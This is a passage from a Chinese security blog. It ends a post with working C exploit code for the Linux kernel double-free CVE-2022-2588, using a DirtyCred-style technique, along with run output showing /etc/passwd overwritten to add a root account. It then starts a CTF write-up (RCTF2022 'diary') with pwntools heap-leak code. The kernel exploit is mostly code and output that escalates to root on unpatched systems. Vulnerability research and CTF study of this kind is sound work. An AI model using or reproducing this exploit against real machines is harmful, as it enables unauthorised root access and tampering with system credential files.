(overlapped)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 13. finish exploitation</span></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">while</span> (run_write) &#123; sleep(<span class="number">1</span>); &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[13] check whether we overwrite the privileged file\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!overlapped) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] no overlap found :(...\n&quot;</span>);</span><br><span class="line">        write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">        <span class="comment">// check if user (hi) in the passwd</span></span><br><span class="line">        read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>))</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] not successful : %s\n&quot;</span>, buf);</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_exp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 0. initialize pipe as notifier</span></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_parent) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_child) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_defrag) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">0</span>]) == <span class="number">-1</span>)   <span class="comment">// begin spray file</span></span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">1</span>]) == <span class="number">-1</span>)   <span class="comment">// end spray file</span></span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] fail to create pipes\n&quot;</span>);</span><br><span class="line">    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 12. Thread 3 - spray 4096*2 priviledged `file` objects to replace unprivileged `file` (wait pipe_file_spray[0])</span></span><br><span class="line">        adjust_rlimit();</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))   <span class="comment">// use pipe_file_spray to notify</span></span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;[-] read file spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[12] got cmd, start spraying 4096*2 `file` by opening %s\n&quot;</span>, target);</span><br><span class="line">        spray_num = <span class="number">4096</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// spray 4096 `file` (parent-process)</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// spray 4096 `file` (sub-process)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">            pin_on_cpu(i % cpu_cores);</span><br><span class="line">            open(target, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] spray done\n&quot;</span>);</span><br><span class="line">        write(pipe_file_spray[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>);  <span class="comment">// write pipe_file_spray[1] —— finish spray `file`</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0. preprocess &amp; start main exploit</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">        pre_exploit();  <span class="comment">// set up process memory / working dir / namespace</span></span><br><span class="line">        exploit();      <span class="comment">// main exploit</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. defragmentation —— spray 10000 `file` to exhaust all file slabs for cross cache - all cores</span></span><br><span class="line">            adjust_rlimit();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[1] defragmentation - spray 10000 `file` to exhaust all file slabs for cross cache\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_defrag[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] failed write defrag&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 2. spray thread - core 0         spray kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            setup_namespace();</span><br><span class="line">            pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">            assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">            add_qdisc(sprayfd);</span><br><span class="line">            <span class="comment">// 2-1. prepare payload</span></span><br><span class="line">            <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">            <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] failed read defrag&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">            <span class="keyword">int</span> middle = <span class="number">38</span>;       <span class="comment">// 38</span></span><br><span class="line">            <span class="keyword">int</span> end = middle + <span class="number">40</span>; <span class="comment">// 40</span></span><br><span class="line">      <span class="comment">// 2-2. spray (38+3)*32 filters in kmalloc-192 &amp; kmalloc-256 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 4. spray more filters in kmalloc-192 &amp; kmalloc-256 </span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">            <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[4] spray kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="comment">// 5. free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// prevent double free of 192 and being reclaimed by others</span></span><br><span class="line">                <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 7. free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">            <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//getchar();</span></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">1000</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    global = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">        MAP_SHARED | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(global, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    self_path = global;</span><br><span class="line">    <span class="built_in">snprintf</span>(self_path, <span class="number">0x100</span>, <span class="string">&quot;%s/%s&quot;</span>, get_current_dir_name(), argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] self path %s\n&quot;</span>, self_path);</span><br><span class="line">    <span class="comment">// prepare write data —— evil data + existing data in /etc/passwd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare evil data\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(target, <span class="number">0</span>);</span><br><span class="line">    content = (<span class="keyword">char</span>*)(global + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(content, overwrite);</span><br><span class="line">    read(fd, content + <span class="built_in">strlen</span>(overwrite), <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="comment">// run_exp() in sub-process</span></span><br><span class="line">    assert(pipe(pipe_main) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        run_exp();                  <span class="comment">// main exploit</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123; sleep(<span class="number">10000</span>); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// judge if succeed</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    read(pipe_main[<span class="number">0</span>], &amp;data, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] succeed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./exploit</span></span><br><span class="line">[*] self path /home/hi/./exploit</span><br><span class="line">[*] prepare evil data</span><br><span class="line">Old limits -&gt; soft limit= 14096 	 hard limit= 14096 </span><br><span class="line">[*] starting exploit, num of cores: 4</span><br><span class="line">[1] defragmentation - spray 10000 `file` to exhaust all file slabs for cross cache</span><br><span class="line">[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[3] allocate the vulnerable filter</span><br><span class="line">[4] spray kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[6] 1st freed the filter object</span><br><span class="line">[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[8] spray 4000 uprivileged `file`</span><br><span class="line">[9] 2nd free the filter object</span><br><span class="line">pause after 2nd free</span><br><span class="line">[10] spraying 5000 unprivileged `file`</span><br><span class="line">[10-1] found overlapped file, id : 22, 1930</span><br><span class="line">[11] start 2 threads compete to write</span><br><span class="line">[11-1] start slow write</span><br><span class="line">[11-2] write evil data after the slow write</span><br><span class="line">[12] got cmd, start spraying 4096*2 `file` by opening /etc/passwd</span><br><span class="line">[*] spray done</span><br><span class="line">[*] write done, spent 9.352879 s</span><br><span class="line">[13] check whether we overwrite the privileged file</span><br><span class="line">[+] succeed</span><br><span class="line"><span class="meta">$</span><span class="bash"> su hi</span></span><br><span class="line">Password: </span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(hi) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">hi:x:0:0:root:/:/bin/sh</span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/575931271">CVE-2022-2588 Double-free 漏洞 DirtyCred 利用</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/19/RCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/19/RCTF2022/" class="post-title-link" itemprop="url">RCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-19 17:49:21" itemprop="dateCreated datePublished" datetime="2022-12-19T17:49:21+08:00">2022-12-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-22 19:03:17" itemprop="dateModified" datetime="2022-12-22T19:03:17+08:00">2022-12-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>24k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>22 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">diary: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=f9a0df0117a1b0f105959590bb560a21554a17e2, stripped</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序的 “dele” 模块有点漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2022</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2021</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2020</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2019</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这里我们只释放了 chunk0，但 chunk3 也被释放了，并且堆块整体向上移动（如果我们释放最后一个 chunk，则是正常的）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555557f080</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555557f080</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555557f088</span> ◂— <span class="number">0x311</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555557f090</span> ◂— <span class="number">0x7e5550a0c0a1e1e</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555557f098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555557f0a0</span> —▸ <span class="number">0x555555580350</span> ◂— <span class="number">0x3232323220202020</span> (<span class="string">&#x27;    2222&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55555557f0a8</span> ◂— <span class="number">0x7e4550a0c0a1e1e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55555557f0b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55555557f0b8</span> —▸ <span class="number">0x555555580690</span> ◂— <span class="number">0x3333333320202020</span> (<span class="string">&#x27;    3333&#x27;</span>)</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555557f0c0</span> ◂— <span class="number">0x7e3550a0c0a1e1e</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55555557f0c8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55555557f0d0</span> —▸ <span class="number">0x5555555809d0</span> —▸ <span class="number">0x55555557fd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555557f0d8</span> ◂— <span class="number">0x7e3550a0c0a1e1e</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55555557f0e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55555557f0e8</span> —▸ <span class="number">0x5555555809d0</span> —▸ <span class="number">0x55555557fd00</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>程序可以控制前3个 chunk，利用第3个 chunk 就可以完成泄露</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>利用这个程序漏洞就可以完成泄露：</p>
<ul>
<li>泄露 heap_base：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2022</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2021</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2020</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2019</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2018</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2017</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2016</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x14390</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<ul>
<li>泄露 libc_base：</li>
</ul>
